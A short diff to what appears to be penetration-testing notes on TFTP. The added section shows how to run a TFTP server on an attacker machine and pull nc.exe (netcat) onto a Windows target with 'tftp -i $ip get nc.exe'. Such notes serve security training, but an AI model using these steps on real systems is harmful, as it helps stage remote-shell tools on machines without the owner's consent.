@@ -13,3 +13,13 @@ nmap -Pn -sU -p69 --script tftp-enum <target-ip>
 # We will have FTP like commands such as `put` and `get`.
 tftp <target-ip>
 
+
+## Transfer Files through TFTP
+On the attacker machine:
+mkdir /tftp
+atftpd --daemon --port 69 /tftp
+cp /usr/share/windows-binaries/nc.exe /tftp/
+
+On Target:
+EX. FROM WINDOWS HOST:
+C:\Users\Offsec>tftp -i $ip get nc.exe
